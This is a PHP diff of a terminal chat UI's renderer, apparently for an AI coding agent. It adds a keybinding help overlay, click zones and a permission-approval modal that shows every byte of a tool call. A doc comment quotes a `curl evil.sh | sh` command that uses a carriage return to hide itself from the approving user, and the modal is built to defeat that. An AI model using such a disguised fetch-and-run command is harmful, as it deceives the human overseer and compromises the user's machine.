+        $lines = explode("\n", $overlay);
+        $from  = 0;
+        foreach ($rows as $id => $row) {
+            for ($i = $from, $n = count($lines); $i < $n; $i++) {
+                if (str_contains($lines[$i], $row)) {
+                    self::$sessionRowZones[] = [
+                        'id' => (string) $id,
+                        'line' => $lines[$i],
+                        'acts' => $id === $selected ? $acts : [],
+                    ];
+                    $from                    = $i + 1;
+
+                    break;
+                }
+            }
+        }
+    }
+
+    /**
+     * Turn each picker overlay line recorded by {@see recordSessionRowZones()}
+     * into a `session-row:<index>` click zone on the ALREADY-composited frame
+     * (E744 WS4) — see {@see $sessionRowZones} for why the mark cannot happen
+     * before the composite, and {@see markPaletteItems()} for the identical
+     * cell-exactness and clipped-row rules.
+     */
+    private static function markSessionRows(string $frame): string
+    {
+        if (self::$sessionRowZones === []) {
+            return $frame;
+        }
+
+        $lines = explode("\n", $frame);
+        $from  = 0;
+        foreach (self::$sessionRowZones as $zone) {
+            for ($i = $from, $n = count($lines); $i < $n; $i++) {
+                $at = strpos($lines[$i], $zone['line']);
+                if ($at === false) {
+                    continue;
+                }
+
+                $lines[$i] = substr_replace(
+                    $lines[$i],
+                    Mark::zone(self::SESSION_ROW_ZONE_PREFIX . $zone['id'], self::markSessionActs($zone['id'], $zone['line'], $zone['acts'])),
+                    $at,
+                    strlen($zone['line']),
+                );
+                $from = $i + 1;
+
+                break;
+            }
+        }
+
+        return implode("\n", $lines);
+    }
+
+    /**
+     * Wrap each action glyph of the highlighted picker row in its
+     * `session-act:<row>:<verb>` zone. The cluster is right-aligned, so each
+     * glyph is found by its LAST occurrence, right to left (delete, pin,
+     * rename): the pin glyph also opens a pinned row's title, and the search
+     * for each glyph stops short of the one wrapped before it.
+     *
+     * @param array<string, string> $acts verb => the styled glyph as painted
+     */
+    private static function markSessionActs(string $row, string $line, array $acts): string
+    {
+        $end = strlen($line);
+        foreach (array_reverse($acts, true) as $verb => $glyph) {
+            $at = strrpos(substr($line, 0, $end), $glyph);
+            if ($at === false) {
+                continue;
+            }
+            $line = substr_replace($line, Mark::zone(self::SESSION_ACT_ZONE_PREFIX . $row . ':' . $verb, $glyph), $at, strlen($glyph));
+            $end = $at;
+        }
+
+        return $line;
+    }
+
+    /**
+     * The opening SGR sequence of a style, with no text and no trailing
+     * reset. Needed because {@see Style::render()} terminates every run with
+     * a full reset: a highlighted run nested inside a coloured palette row
+     * would otherwise strip the row's own colour off everything after it.
+     * Re-emitting this after each highlighted run restores the row style.
+     */
+    private static function sgrOpen(Style $style): string
+    {
+        $rendered = $style->render('');
+        $reset = "\x1b[0m";
+
+        return str_ends_with($rendered, $reset)
+            ? substr($rendered, 0, -strlen($reset))
+            : $rendered;
+    }
+
+    /**
+     * The in-app keybinding reference, composited over the whole frame by
+     * {@see renderView()} via {@see Veil} (crush_code.md Phase 8 item 2).
+     * Returns '' (nothing composited) when it is closed — see
+     * {@see Chat::keyHelp()}.
+     *
+     * Rows come from {@see KeyBindingRegistry}, the same list
+     * {@see \SugarCraft\Code\Tui\KeyboardHandler} derives its claimed-chord
+     * sets from, so this screen cannot describe a keyboard the app does not
+     * have — the drift that made a hand-written cheat sheet not worth
+     * shipping. Only {@see KeyBindingRegistry::live()} rows are painted;
+     * a row marked dormant is a chord some handler claims but nothing acts
+     * on, and promising it here would be worse than omitting it.
+     *
+     * Sizing follows {@see renderPermissionPrompt()}'s rule — the box's OWN
+     * chrome comes off the width first — and lives in
+     * {@see keyHelpGeometry()}, which is also what says when the box does not
+     * fit at all and why neither of its two bounds has a floor.
+     */
+    private static function renderKeyHelp(Chat $chat, Theme $theme): string
+    {
+        $offset = $chat->keyHelp();
+        if ($offset === null) {
+            self::$keyHelpMaxOffset = 0;
+
+            return '';
+        }
+
+        $geometry = self::keyHelpGeometry($chat);
+        if ($geometry === null) {
+            // No room for a border plus one cell of content. Nothing is drawn,
+            // but Chat keeps the reference OPEN, so it appears the moment the
+            // terminal (or the hosting pane) grows — the state is the user's,
+            // only the space to paint it in is missing. That the reference is
+            // still eating keystrokes is said on the status bar instead, by
+            // renderStatusBar(), which asks this same method whether the box
+            // fits: an open modal that is invisible AND silent is a stuck
+            // terminal as far as the user can tell.
+            self::$keyHelpMaxOffset = 0;
+
+            return '';
+        }
+
+        [$width, $boxRows] = $geometry;
+
+        // Content rows inside the border. The footer hint is the first thing to
+        // go when there is only one row to spend, since a binding is what the
+        // screen is for and the hint merely restates how to leave it.
+        $viewport = $boxRows - 2;
+        $showHint = $viewport > 1;
+
+        $keyCol = 0;
+        foreach (KeyBindingRegistry::live() as $binding) {
+            $keyCol = max($keyCol, Width::of($binding->keys));
+        }
+        // A pathologically narrow box truncates the KEY so that a column is
+        // always left for the description and the space before it: `$room`
+        // below is `$width - $keyCol - 1`, and this cap is what keeps it
+        // positive. Measured, the Enter row renders `E` at cols=5, `E S` at 7
+        // and `En S` at 8 — the key losing characters, not the description
+        // losing its column. (Under width 3 there is nothing to split and the
+        // description does go.)
+        //
+        // Deliberately the reverse of what happens without it: Style::width()
+        // TRUNCATES the assembled line rather than wrapping it (measured: a
+        // 16-column row at width 4 renders `Ente`), so dropping the cap would
+        // spend the whole box on the key and lose the description entirely.
+        // Both fields staying present and aligned at every width is worth more
+        // than four characters of key, since neither is legible down here.
+        $keyCol = min($keyCol, max(1, $width - 2));
+
+        $keyStyle = Style::new()->foreground($theme->userLabel)->bold();
+        $headerStyle = Style::new()->foreground($theme->assistantLabel)->bold();
+        $descStyle = Style::new()->foreground($theme->systemLabel);
+        $hintStyle = Style::new()->foreground($theme->systemLabel)->faint();
+
+        /** @var list<string> $lines already-styled content rows */
+        $lines = [];
+        foreach (KeyBindingRegistry::grouped() as $context => $bindings) {
+            if ($lines !== []) {
+                $lines[] = '';
+            }
+            $lines[] = $headerStyle->render(Width::truncate($context, $width));
+            foreach ($bindings as $binding) {
+                $key = Width::truncate($binding->keys, $keyCol);
+                $pad = str_repeat(' ', max(0, $keyCol - Width::of($key)));
+                $room = $width - $keyCol - 1;
+                $desc = $room > 0 ? Width::truncate($binding->description, $room) : '';
+                $lines[] = $keyStyle->render($key) . $pad . ' ' . $descStyle->render($desc);
+            }
+        }
+
+        // Clamped here rather than trusted from Chat for the reason
+        // renderView() re-clamps the transcript's offset: the stored value was
+        // clamped against whatever frame was on screen when the key was
+        // pressed, and this frame's geometry can differ (a resize, a narrower
+        // hosted pane).
+        $body = $viewport - ($showHint ? 1 : 0);
+        self::$keyHelpMaxOffset = max(0, count($lines) - $body);
+        $start = max(0, min($offset, self::$keyHelpMaxOffset));
+        $visible = array_slice($lines, $start, $body);
+
+        if ($showHint) {
+            $visible[] = $hintStyle->render(Width::truncate(
+                // The footer is where the MODAL's own keys are stated — the
+                // rows above describe the app's ordinary keyboard, which is
+                // not what those keys do while this screen is up. The wheel
+                // belongs here for the same reason: with the reference open it
+                // scrolls the reference (see Chat::scrollTranscript()).
+                //
+                // "? closes and types" is the one behaviour a reader would not
+                // guess and would be annoyed to discover by accident, so it is
+                // stated rather than left to the code: pressing "?" a second
+                // time dismisses this screen AND puts the literal character in
+                // the input box, which is what makes a message beginning with
+                // "?" typeable (Chat::handleKeyHelpKey() carries the reasoning).
+                // Anyone who wants a clean dismissal has the Esc named first.
+                //
+                // Widths, measured with Width::of against KEY_HELP_COLS = 64,
+                // the box's widest content: 63 columns for the scrolling form
+                // and 35 for the other, so one column of headroom. Thin, and
+                // asserted rather than trusted —
+                // KeyHelpTest::testTheFooterFitsTheBoxWithARealMarginAndLosesItsTailFirst().
+                //
+                // Truncating this line is the cheapest truncation in the box
+                // because it loses no ROW of the reference, but it is not free
+                // and an earlier version of this comment implied it was: the
+                // footer loses its own clauses, and measured, by cols 14 it
+                // reads just `Esc closes` with the `?` clause gone. Clause
+                // ORDER is what makes that acceptable — Esc first so it is the
+                // last thing standing, the scroll clause last so a narrow box
+                // spends it first.
+                self::$keyHelpMaxOffset > 0
+                    ? Lang::t('tui.key_help.footer_scroll')
+                    : Lang::t('tui.key_help.footer'),
+                $width,
+            ));
+        }
+
+        return Style::new()
+            ->border(Border::rounded()->withTitle(' ' . Lang::t('tui.key_help.title') . ' '))
+            ->borderForeground($theme->border)
+            ->padding(0, 1)
+            ->width($width)
+            ->render(implode("\n", $visible));
+    }
+
+    /**
+     * The blocking permission prompt's modal (crush_feat.md §1 E2, the
+     * rendering half), composited over the whole frame by {@see render()}
+     * through the same {@see Veil} mechanism the Ctrl+P palette already uses
+     * rather than a second overlay path. Returns '' (nothing composited)
+     * when no prompt is blocking the turn - see
+     * {@see Chat::pendingPermission()}.
+     *
+     * Shows three things, in the order a user needs them: what is being
+     * asked for (the tool call, through the same
+     * {@see Message::describeToolCall()} label the running placeholder and
+     * the finished marker use, so the same call reads identically in all
+     * three places), why it was stopped (the hook's own question), and how
+     * to answer it. The answer keys are spelled out because this modal is
+     * the ONLY place they appear - {@see renderStatusBar()}'s help text is
+     * about the normal input line, and while a prompt is up none of those
+     * keys do what it says.
+     *
+     * And WHICH keys is a function of the prompt's stage
+     * ({@see \SugarCraft\Code\Chat::permissionStage()}), because the same
+     * letters do different things in each. That is not decoration: a prompt
+     * disarmed by a stray keystroke looks identical to a live one, so without
+     * the {@see PERMISSION_DISARMED_NOTICE} half a user would press `y`, watch
+     * nothing happen, and have no way to find out that Enter is the way back.
+     *
+     * Everything shown here is untrusted: a hook's message, a tool call's
+     * name and its arguments are all model-authored text. Unlike every other
+     * row in the frame, nothing of it is STRIPPED: this is a gate, and its
+     * rule is that every byte shows as visible text (audit 15b-19). A strip
+     * still displays something other than what will run - `\x1b[8m` (SGR
+     * concealed) vanishes without a trace, and a kept CR let
+     * `curl evil.sh | sh #\recho 'hello world'` repaint its dangerous half
+     * with the harmless one, so the user approved a command they never saw.
+     * So the body goes through {@see wrapPermissionText()} (CR to a row
+     * break, every other control as caret / `<U+00XX>` text via
+     * {@see Sanitize::visibleControls()}, then a cell-counted wrap) and the
+     * title through {@see permissionTitle()} (the same policy folded to one
+     * row). Either way no ESC, C1 or CR reaches the terminal, so the call
+     * being gated cannot repaint the dialog asking about it.
+     */
+    private static function renderPermissionPrompt(Chat $chat, Theme $theme): string
+    {
+        $request = $chat->pendingPermission();
+        if ($request === null) {
+            return '';
+        }
+
+        $call = $request->toolCall;
+        // Never wider than the terminal: a modal that overflows $cols would be
+        // wrapped by the terminal itself, which breaks the one-line-per-row
+        // assumption render()'s viewport clipping is built on. The floor is 1,
+        // like the transcript's own content width: it was 20 (R4, the residual
+        // of audit 15b-09), so under 26 columns the box came out wider than
+        // the terminal and the overlay clip cut off its right border. Now the
+        // whole box fits from 7 columns up, where the modal's OWN chrome stops
+        // fitting. (CL-3: this cap used to read `cols - SHELL_CHROME_COLS`
+        // because the bordered transcript shell's 6 equalled the modal's 6;
+        // with the shell's chrome now 0, the number is stated under its true
+        // owner — the box's own border + padding(1, 2).)
+        $inner = max(1, min(self::PERMISSION_MODAL_COLS, $chat->cols() - self::PERMISSION_MODAL_CHROME_COLS));
+
+        $lines = [
+            Style::new()->foreground($theme->userLabel)->bold()
+                ->render(self::PERMISSION_TITLE_ICON . self::permissionTitle(
+                    $call->name,
+                    $inner - Width::of(self::PERMISSION_TITLE_ICON),
+                )),
+            ...self::permissionSubjectLines($call, $inner, $theme),
+        ];
+
+        $prompt = self::wrapPermissionText($request->prompt, $inner);
+        if ($prompt !== '') {
+            $lines[] = '';
+            $lines[] = Style::new()->foreground($theme->systemLabel)->render($prompt);
+        }
+
+        $stage = $chat->permissionStage();
+        $alwaysScope = $chat->permissionAlwaysScope();
+
+        // A question that is put every time says so, with why, instead of
+        // offering an `a` that could not remember it.
+        $alwaysAsks = $chat->permissionAlwaysAsks();
+        if ($alwaysAsks !== null && $stage === PermissionPromptStage::Armed) {
+            $lines[] = '';
+            $lines[] = Style::new()->foreground($theme->systemLabel)->render(self::wrapPermissionText(
+                Lang::t('tui.permission.always_asks', ['reason' => self::permissionVisibleOneLine($alwaysAsks)]),
+                $inner,
+            ));
+        }
+
+        // The scope being edited, in the modal itself (the draft box it is
+        // typed into sits under the overlay), and why Enter refused it.
+        if ($stage === PermissionPromptStage::EditingScope) {
+            $scope = trim((string) preg_replace('/\s+/u', ' ', self::permissionVisibleOneLine($chat->inputBuf)));
+            $lines[] = '';
+            $lines[] = Style::new()->foreground($theme->userLabel)->bold()->render(self::wrapPermissionText(
+                Lang::t('tui.permission.scope_lead', ['tool' => self::permissionVisibleOneLine($call->name)])
+                    . ' ' . ($scope === '' ? Lang::t('tui.permission.type_a_scope') : $scope),
+                $inner,
+            ));
+            $error = $chat->permissionScopeError();
+            if ($error !== null) {
+                $lines[] = Style::new()->foreground($theme->systemLabel)->bold()->render(self::wrapPermissionText($error, $inner));
+            }
+        }
+
+        $question = $request->pendingAsk?->question();
+
+        // The note being typed, in the modal itself: the draft box it is typed
+        // into sits under the overlay.
+        if ($stage === PermissionPromptStage::WritingNote) {
+            $note = trim((string) preg_replace('/\s+/u', ' ', self::permissionVisibleOneLine($chat->inputBuf)));
+            $lead = match ($question) {
+                \SugarCraft\Code\Tools\BuiltIn\AskUserTool::NAME => Lang::t('tui.permission.lead_answer'),
+                \SugarCraft\Code\Tools\BuiltIn\PlanExitTool::NAME => Lang::t('tui.permission.lead_feedback'),
+                default => Lang::t('tui.permission.lead_refusal'),
+            };
+            $lines[] = '';
+            $lines[] = Style::new()->foreground($theme->userLabel)->bold()->render(
+                self::wrapPermissionText($lead . ' ' . ($note === '' ? Lang::t('tui.permission.type_a_note') : $note), $inner),
+            );
+        }
+
+        if ($stage === PermissionPromptStage::Disarmed) {
+            $lines[] = '';
+            $lines[] = Style::new()->foreground($theme->systemLabel)->bold()->render(
+                self::wrapPermissionText(Lang::t(self::PERMISSION_DISARMED_NOTICE), $inner),
+            );
+        }
+
+        $options = self::permissionOptions($stage, $question, $request->pendingAsk?->choices() ?? [], $alwaysScope, $chat->permissionEditableScope() !== null, $chat->permissionPersistScope());
+
+        $lines[] = '';
+        foreach ($options as $option) {
+            [$keys, $label] = $option;
+            $lines[] = Style::new()->foreground($theme->userLabel)->bold()->render($keys)
+                . ' ' . Style::new()->foreground($theme->systemLabel)->faint()
+                    ->render(self::wrapPermissionText(Lang::t($label, $option[2] ?? []), max(1, $inner - Width::string($keys) - 1)));
+        }
+
+        // Which mode asked, and how to change it, for a question about a call
+        // (not the model's own questions): one faint row, the short form on a
+        // narrow box, clipped rather than wrapped.
+        $mode = $question === null ? self::permissionModeName($chat) : null;
+        if ($mode !== null) {
+            $hint = Lang::t('tui.permission.mode_hint', ['mode' => $mode]);
+            if (Width::of($hint) > $inner) {
+                $hint = Lang::t('tui.permission.mode_hint_short', ['mode' => $mode]);
+            }
+            $lines[] = '';
+            $lines[] = Style::new()->foreground($theme->systemLabel)->faint()->render(Width::truncate($hint, $inner));
+        }
+
+        return Style::new()
+            ->border(Border::rounded()->withTitle(match ($question) {
+                \SugarCraft\Code\Tools\BuiltIn\AskUserTool::NAME => ' ' . Lang::t('tui.permission.title_ask') . ' ',
+                \SugarCraft\Code\Tools\BuiltIn\PlanExitTool::NAME => ' ' . Lang::t('tui.permission.title_plan') . ' ',
+                default => ' ' . Lang::t('tui.permission.title') . ' ',
+            }))
+            ->borderForeground($theme->border)
+            ->padding(1, 2)
+            ->width($inner)
+            ->render(implode("\n", $lines));
+    }
+
+    /**
+     * The permission mode the question on screen was asked under — the
+     * engine ask's own `mode`, else the session gate's — or null without one.
+     */
+    private static function permissionModeName(Chat $chat): ?string
+    {
+        $mode = $chat->pendingPermission()?->pendingAsk?->mode ?? '';
+        if ($mode === '') {
+            $mode = $chat->currentPermissionMode()?->value ?? '';
+        }
+        $mode = self::permissionVisibleOneLine($mode);
+
+        return $mode === '' ? null : $mode;
+    }
+
+    /**
+     * The `[keys, label]` rows the permission modal's footer advertises for
+     * $stage — question-aware (roadmap 5.7-2). A question the model put
+     * itself ($question, from {@see \SugarCraft\Code\Backend\PendingAsk::question()})
+     * keeps the same letters, worded as an answer to a question rather than a
+     * verdict on a call, with no `a` (there is no call to allow for the
+     * session); `AskUser`'s $choices lead with their number keys, and
+     * `PlanExit`'s read approve / feedback / refuse. `Chat::handlePermissionKey()`
+     * holds the arms these describe.
+     *
+     * The `a` row names what it would remember ($alwaysScope, from
+     * {@see \SugarCraft\Code\Chat::permissionAlwaysScope()}) — `Bash(git status *)`,
+     * `this exact command` — and answers at once; `e` ($editable) edits that
+     * scope first. A question that cannot be remembered (null) offers
+     * neither: the modal says why above the keys.
+     *
+     * Each label is a `lang/en.php` key; a third element carries its
+     * placeholders.
+     *
+     * @param list<string> $choices
+     *
+     * @return list<array{0: string, 1: string, 2?: array<string, int|string>}>
+     */
+    private static function permissionOptions(PermissionPromptStage $stage, ?string $question, array $choices, ?string $alwaysScope = null, bool $editable = false, ?string $persistScope = null): array
+    {
+        $askUser = \SugarCraft\Code\Tools\BuiltIn\AskUserTool::NAME;
+        $planExit = \SugarCraft\Code\Tools\BuiltIn\PlanExitTool::NAME;
+
+        return match ($stage) {
+            PermissionPromptStage::EditingScope => self::PERMISSION_SCOPE_OPTIONS,
+            PermissionPromptStage::Disarmed => self::PERMISSION_DISARMED_OPTIONS,
+            PermissionPromptStage::WritingNote => match ($question) {
+                $askUser => [['Enter', 'tui.permission.send_answer'], self::PERMISSION_NOTE_OPTIONS[1]],
+                $planExit => [['Enter', 'tui.permission.send_feedback'], self::PERMISSION_NOTE_OPTIONS[1]],
+                default => self::PERMISSION_NOTE_OPTIONS,
+            },
+            PermissionPromptStage::Armed => match (true) {
+                $question === $planExit => [
+                    ['y', 'tui.permission.plan_approve'],
+                    ['r', 'tui.permission.plan_feedback'],
+                    ['n / Esc', 'tui.permission.plan_refuse'],
+                    ['x', 'tui.permission.plan_refuse_stop'],
+                ],
+                $question === $askUser && $choices !== [] => [
+                    [\count($choices) === 1 ? '1' : '1–' . \count($choices), 'tui.permission.ask_pick'],
+                    ['y', 'tui.permission.ask_recommended'],
+                    ['r', 'tui.permission.ask_own_words'],
+                    ['n / Esc', 'tui.permission.ask_decline'],
+                    ['x', 'tui.permission.ask_decline_stop'],
+                ],
+                $question === $askUser => [
+                    ['y', 'tui.permission.ask_yes'],
+                    ['n / Esc', 'tui.permission.ask_no'],
+                    ['r', 'tui.permission.ask_own_words'],
+                    ['x', 'tui.permission.ask_decline_stop'],
+                ],
+                // A question that cannot be remembered offers no `a` at all:
+                // the modal says why above the keys instead.
+                $alwaysScope === null => array_values(array_filter(
+                    self::PERMISSION_OPTIONS,
+                    static fn (array $row): bool => $row[0] !== 'a' && $row[0] !== 'p' && $row[0] !== 'e',
+                )),
+                default => array_values(array_map(
+                    static fn (array $row): array => match ($row[0]) {
+                        'a' => ['a', 'tui.permission.always_scope', ['scope' => self::permissionVisibleOneLine($alwaysScope)]],
+                        'p' => ['p', 'tui.permission.persist_scope', ['scope' => self::permissionVisibleOneLine((string) $persistScope)]],
+                        default => $row,
+                    },
+                    array_filter(
+                        self::PERMISSION_OPTIONS,
+                        static fn (array $row): bool => ($editable || $row[0] !== 'e')
+                            && ($persistScope !== null || $row[0] !== 'p'),
+                    ),
+                )),
+            },
+        };
+    }
+
+    /**
+     * The modal's "what will run" rows for $call: for the shell tools
+     * (`Bash`, `PtyRun` — both carry their command under `command`), the
+     * question and the COMMAND itself ({@see permissionCommandBlock()}); for
+     * any other tool, the call with its arguments. The model's `description`
+     * is a caption it wrote about its own call, so it is never shown
+     * INSTEAD of the call — {@see Message::describeToolCall()} prefers it,
+     * which is right for a transcript row and wrong for a gate — only
+     * beneath it, faint, as the agent's note.
+     *
+     * @return list<string>
+     */
+    private static function permissionSubjectLines(\SugarCraft\Code\ToolCall $call, int $inner, Theme $theme): array
+    {
+        $arguments = $call->arguments;
+        $caption = $arguments['description'] ?? null;
+        if (\is_string($caption)) {
+            unset($arguments['description']);
+        }
+
+        // Both shell tools carry their command line under `command`; show it as a
+        // `$ …` block so the human approves the exact shell text either way.
+        $isShell = $call->name === 'Bash' || $call->name === 'PtyRun';
+        $command = $isShell ? ($arguments['command'] ?? null) : null;
+        $lines = [];
+        if (\is_string($command) && trim($command) !== '') {
+            $lines[] = Style::new()->foreground($theme->userLabel)->bold()
+                ->render(self::wrapPermissionText(Lang::t('tui.permission.run_command'), $inner));
+            $lines[] = Style::new()->foreground($theme->assistantLabel)
+                ->render(self::permissionCommandBlock($command, $inner));
+        } else {
+            $lines[] = Style::new()->foreground($theme->assistantLabel)->render(self::wrapPermissionText(
+                Message::describeToolCall(new \SugarCraft\Code\ToolCall($call->name, $arguments, $call->id)),
+                $inner,
+            ));
+        }
+
+        $caption = \is_string($caption) ? trim((string) preg_replace('/\s+/u', ' ', self::permissionVisibleOneLine($caption))) : '';
+        if ($caption !== '') {
+            $rows = explode("\n", Width::wrap(Lang::t('tui.permission.agent_note', ['note' => $caption]), max(2, $inner)));
+            if (\count($rows) > 2) {
+                $rows = [$rows[0], Width::truncate($rows[1], max(1, $inner - 1)) . '…'];
+            }
+            $lines[] = Style::new()->foreground($theme->systemLabel)->faint()->render(implode("\n", $rows));
+        }
+
+        return $lines;
+    }
+
+    /**
+     * A `Bash` command as the gate sees it, every byte visible
+     * ({@see permissionVisible()}): `$ ` before the first line, its
+     * continuation rows and further lines indented under it, wrapped to
+     * $inner cells. A command taller than {@see PERMISSION_COMMAND_MAX_ROWS}
+     * loses rows from its MIDDLE, with a row saying how many: the head says
+     * what starts, and the tail is where `| sh` or `&& rm …` would be.
+     */
+    private static function permissionCommandBlock(string $command, int $inner): string
+    {
+        $text = trim(self::permissionVisible(str_replace(["\r\n", "\r"], "\n", $command)), "\n");
+        // The `$ ` gutter only where it leaves room for the command itself.
+        $gutter = $inner >= 6;
+        $room = $gutter ? $inner - 2 : max(1, $inner);
+
+        $rows = [];
+        foreach (explode("\n", $text) as $index => $line) {
+            foreach (explode("\n", Width::wrap($line, $room)) as $part => $row) {
+                $rows[] = ($gutter ? ($index === 0 && $part === 0 ? '$ ' : '  ') : '') . $row;
+            }
+        }
+
+        if (\count($rows) > self::PERMISSION_COMMAND_MAX_ROWS) {
+            $tail = self::PERMISSION_COMMAND_TAIL_ROWS;
+            $head = self::PERMISSION_COMMAND_MAX_ROWS - $tail - 1;
+            $hidden = \count($rows) - $head - $tail;
+            $rows = [
+                ...\array_slice($rows, 0, $head),
+                Width::truncate('  ' . Lang::t('tui.permission.more_command_lines', ['count' => $hidden]), $inner),
+                ...\array_slice($rows, -$tail),
+            ];
+        }
+
+        return implode("\n", $rows);
+    }
+
+    /**
+     * Lay sugar-toast's box for `$toast` over the top-right corner of `$frame`,
+     * one row down (the top row is the shell's tab strip) and one column in.
+     *
+     * Each covered row keeps its cells left and right of the box, and loses
+     * its zone sentinels whole: a click target half under a transient toast is
+     * not one the user can see to aim at, and a sentinel cut in two would make
+     * the zone scan throw. Nothing is drawn when the frame is too short or too
+     * narrow to hold the box with a margin — the toast is a convenience, and
+     * the settings view's own status line carries the same report.
+     */
+    private static function overlaySettingsToast(string $frame, \SugarCraft\Toast\Toast $toast, int $cols): string
+    {
+        $width = min(Chat::SETTINGS_TOAST_COLS, $cols - 4);
+        if ($width < 20) {
+            return $frame;
+        }
+
+        $box = [];
+        foreach (explode("\n", $toast->view('', $width, 0)) as $line) {
+            // The canvas is `$width` wide; a shorter message leaves blank
+            // cells after the right border that must not cover the frame.
+            $line = rtrim($line, ' ');
+            if ($line !== '') {
+                $box[] = $line;
+            }
+        }
+
+        $rows = explode("\n", $frame);
+        $top = 1;
+        if ($box === [] || \count($rows) < $top + \count($box) + 1) {
+            return $frame;
+        }
+
+        foreach ($box as $i => $line) {
+            $boxWidth = Width::string($line);
+            $start = max(0, $cols - $boxWidth - 1);
+            $row = self::stripZoneMarkers($rows[$top + $i]);
+            $left = Width::takeAnsi($row, $start);
+            // takeAnsi() keeps a wide grapheme whole, so it can overshoot.
+            if (Width::string($left) > $start) {
+                $left = Width::takeAnsi($row, $start - 1);
+            }
+            $rows[$top + $i] = $left
+                . str_repeat(' ', max(0, $start - Width::string($left)))
+                . "\e[0m" . $line . "\e[0m"
+                . Width::dropAnsi($row, $start + $boxWidth);
+        }
+
+        return implode("\n", $rows);
+    }
+
+    /**
+     * Right-pad `$frame`'s lines so an overlay of `$overlay`'s width composites
+     * onto it without being clipped, never past `$cols`.
+     *
+     * {@see Veil::composite()} derives its canvas from the background's widest
+     * line, so a frame whose content happens to be narrow silently truncates
+     * any wider overlay. Padding is applied only when an overlay is actually
+     * being composited, so a plain frame keeps its existing ragged-right shape
+     * (and the trailing-space-free output every other renderer test asserts on).
+     */
+    private static function padForOverlay(string $frame, string $overlay, int $cols): string
+    {
+        $lines = explode("\n", $frame);
+
+        $frameWidth = 0;
+        foreach ($lines as $line) {
+            $frameWidth = max($frameWidth, Width::string($line));
+        }
+
+        $overlayWidth = 0;
+        foreach (explode("\n", $overlay) as $line) {
+            $overlayWidth = max($overlayWidth, Width::string($line));
+        }
+
+        $target = min(max(1, $cols), max($frameWidth, $overlayWidth));
+        if ($target <= $frameWidth) {
+            return $frame;
+        }
+
+        foreach ($lines as $index => $line) {
+            $pad = $target - Width::string($line);
+            if ($pad > 0) {
+                $lines[$index] = $line . str_repeat(' ', $pad);
+            }
+        }
+
+        return implode("\n", $lines);
+    }
+
+    /**
+     * $frame with the zone sentinels taken out of every row a vertically
+     * centred $overlay will cover, plus what was taken: per row, each
+     * sentinel's bytes and the VISIBLE column it sat at.
+     *
+     * The rows are chosen with the arithmetic {@see Veil::composite()} uses
+     * (`Position::CENTER->yOffset()` over its `splitLines()` count, no extra
+     * offset). Every other row is returned byte-identical.
+     *
+     * @return array{0: string, 1: array<int, list<array{0: string, 1: int}>>}
+     */
+    private static function liftZonesUnderOverlay(string $frame, string $overlay): array
+    {
+        $rows = explode("\n", $frame);
+        $count = \count($rows);
+        if ($count > 0 && $rows[$count - 1] === '') {
+            --$count; // Veil::splitLines() drops a trailing empty line
+        }
+        $height = \count(explode("\n", rtrim($overlay, "\n")));
+        $top = Position::CENTER->yOffset($height, $count);
+
+        $lifted = [];
+        for ($row = max(0, $top), $end = min($count, $top + $height); $row < $end; $row++) {
+            $line = $rows[$row];
+            if (!str_contains($line, Sentinel::OPEN)) {
+                continue;
+            }
+            if (preg_match_all(self::ZONE_MARKER_PATTERN, $line, $found, PREG_OFFSET_CAPTURE) < 1) {
+                continue;
+            }
+            foreach ($found[0] as [$marker, $offset]) {
+                $lifted[$row][] = [$marker, Width::of(self::stripZoneMarkers(substr($line, 0, $offset)))];
+            }
+            $rows[$row] = self::stripZoneMarkers($line);
+        }
+
+        return [implode("\n", $rows), $lifted];
+    }
+
+    /**
+     * Put the zones {@see liftZonesUnderOverlay()} took out back into the
+     * composited $frame, at the visible columns they came from, each clipped
+     * to the part of its span that lies left or right of the overlay's
+     * columns and dropped when the overlay covers all of it. Those columns are
+     * recomputed the way {@see Veil::composite()} placed the overlay: centred
+     * against the backdrop's widest line, plus $shift.
+     *
+     * An open marker pairs with the next close marker in the row (zones in
+     * this renderer are single-row and unnested), so a dropped zone always
+     * loses both of its sentinels and the scan never sees half a pair.
+     *
+     * @param array<int, list<array{0: string, 1: int}>> $lifted
+     */
+    private static function restoreLiftedZones(string $frame, array $lifted, string $backdrop, string $overlay, int $shift): string
+    {
+        if ($lifted === []) {
+            return $frame;
+        }
+
+        $overlayWidth = self::widestOf(explode("\n", $overlay));
+        $left = Position::CENTER->xOffset($overlayWidth, self::widestOf(explode("\n", $backdrop))) + $shift;
+        $right = $left + $overlayWidth;
+
+        $rows = explode("\n", $frame);
+        foreach ($lifted as $row => $markers) {
+            if (!isset($rows[$row])) {
+                continue;
+            }
+            $keep = [];
+            $open = null;
+            foreach ($markers as $index => [$marker, $col]) {
+                if (!str_starts_with($marker, Sentinel::OPEN . '/')) {
+                    $open = $index;
+                    continue;
+                }
+                if ($open === null) {
+                    continue;
+                }
+                // Clipped to the part still on screen rather than dropped
+                // whole: a tool row's zone spans the whole shell row, so a
+                // palette over its right half would otherwise cost the visible
+                // left half its click too. A zone that keeps cells on both
+                // sides keeps the left part, since an id may appear once.
+                $start = $markers[$open][1];
+                $end = $col;
+                if ($start < $left) {
+                    $end = min($end, $left);
+                } elseif ($end > $right) {
+                    $start = max($start, $right);
+                } else {
+                    $start = $end; // wholly under the overlay
+                }
+                if ($start < $end) {
+                    $keep[] = [$markers[$open][0], $start];
+                    $keep[] = [$marker, $end];
+                }
+                $open = null;
+            }
+            // Right to left, so each insert leaves the columns still to come
+            // where they were; equal columns keep their original order because
+            // an insert lands at the EARLIEST byte that reaches its column.
+            foreach (array_reverse($keep) as [$marker, $col]) {
+                $rows[$row] = self::insertAtColumn($rows[$row], $col, $marker);
+            }
+        }
+
+        return implode("\n", $rows);
+    }
+
+    /**
+     * $row with $marker inserted at the earliest byte where the visible width
+     * before it is $col. SGR/OSC escapes and zone sentinels already in the
+     * row are zero-width here, so the insert never splits an escape or a
+     * grapheme cluster. Past the end of the row it is appended.
+     */
+    private static function insertAtColumn(string $row, int $col, string $marker): string
+    {
+        if ($col <= 0) {
+            return $marker . $row;
+        }
+        $tokens = preg_split(
+            '/(\x1b\[[0-?]*[ -\/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\\\)|\xEE\x80\x80\/?[A-Za-z0-9._:-]*\xEE\x80\x81|\X)/u',
+            $row,
+            -1,
+            PREG_SPLIT_DELIM_CAPTURE | PREG_SPLIT_NO_EMPTY,
+        );
+        if ($tokens === false) {
+            return $row . $marker;
+        }
+
+        $out = '';
+        $width = 0;
+        foreach ($tokens as $i => $token) {
+            if ($token[0] !== "\x1b" && preg_match(self::ZONE_MARKER_PATTERN, $token) !== 1) {
